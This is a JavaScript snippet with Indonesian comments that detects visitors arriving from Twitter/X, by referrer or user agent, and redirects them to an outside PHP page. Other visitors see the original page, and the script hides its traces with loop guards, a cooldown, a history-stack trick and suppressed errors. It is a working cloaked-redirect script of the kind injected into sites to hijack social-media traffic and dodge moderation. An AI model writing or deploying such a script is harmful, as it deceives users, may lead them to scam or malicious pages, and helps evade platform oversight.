(function () {
  try {
    // === SETTING ===
    var target = "https://vidoy.fun/cB6Tyq0.php"; // tujuan redirect (WAJIB https)
    var cooldownMs = 10 * 1000;                   // 1 menit (ubah sesuai kebutuhan)
    // ===============

    if (!/^https:\/\//i.test(target)) return;

    // bypass manual & opsi paksa
    var qs = location.search + location.hash;
    if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(qs)) return;
    var forceX = /[?#](?:.*[&?])?onlyx=1(?:&|$)/i.test(qs);

    // Deteksi Twitter/X (referrer & UA)
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");

    // pola umum: t.co (shortener), twitter.com (referrer), 'Twitter' di UA webview
    var reXRef = /(t\.co|twitter\.com)/i;
    var reXUA  = /twitter/i;

    var isX = reXRef.test(REF) || reXUA.test(UA) || forceX;
    if (!isX) return; // khusus Twitter/X

    // Anti-loop per tab + cooldown lintas tab
    var page = location.origin + location.pathname; // abaikan query biar konsisten
    var sessKey = "redir_x_seen:" + page + "|" + target;
    var cdKey   = "redir_x_cd:"   + page + "|" + target;

    if (sessionStorage.getItem(sessKey)) return;

    var now   = Date.now();
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    // Lock dulu
    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // Bantalan history: biar tab nggak "hilang" saat user balik dari target
    try { history.pushState({ hold: 1 }, "", location.href); } catch (_) {}

    // Delay kecil: beberapa webview X lebih patuh kalau tidak instant
    setTimeout(function () {
      try { location.href = target; } catch (_) {}
    }, 120);

  } catch (_) {
    // diamkan agar tidak ganggu halaman
  }
})();
